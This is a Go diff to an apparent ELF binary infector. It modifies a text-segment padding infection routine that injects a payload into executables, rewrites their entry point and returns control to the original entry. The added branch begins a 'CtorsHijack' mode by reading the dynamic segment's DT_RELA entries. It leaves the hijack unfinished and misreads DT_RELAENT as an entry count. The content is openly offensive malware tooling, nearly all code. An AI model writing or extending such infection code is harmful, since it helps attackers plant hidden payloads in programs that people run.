@@ -46,7 +46,50 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
 		pHeaders := t.Phdrs.([]elf.Prog64)
 		
-		t.Hdr.(*elf.Header64).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+		
+		if (opts & CtorsHijack) == CtorsHijack {
+			
+			if debug {
+				fmt.Println("[+] CtorsHijack requested. Locating and reading Dynamic Segment")
+		
+			}
+			
+			if err := t.GetDyn(); err != nil {
+				return err;
+			}
+			
+			if debug {
+				fmt.Printf("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn64)))
+			}
+			
+			var dtRelaOffset uint64
+			var dtRelaEntryCount uint64
+
+			for _, dynEntry := range t.Dyn.([]elf.Dyn64) {
+				if elf.DynTag(dynEntry.Tag) == elf.DT_RELA {
+					if debug {
+						fmt.Printf("[+] Located DT_RELA @ %016x\n", dynEntry.Val)
+					}
+					dtRelaOffset = dynEntry.Val
+				}
+
+				if elf.DynTag(dynEntry.Tag) == elf.DT_RELAENT {
+					if debug {
+						fmt.Printf("[+] DT_RELA has %d entries\n", dynEntry.Val)
+					}
+					dtRelaEntryCount = dynEntry.Val
+				}
+			}
+
+			if dtRelaEntryCount == 0 || dtRelaOffset == 0 {
+				return errors.New("Error while acquiring DT_RELA or DT_RELAENT")
+			}
+			
+
+		}else {
+			t.Hdr.(*elf.Header64).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+		}
+
 		if debug {
 			fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
 		}
@@ -63,7 +106,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		}
 
 		if !((opts & NoRetOEP) == NoRetOEP) {
-			retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
+			retStub := modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry)
 			t.Payload.Write(retStub)
 		}
 
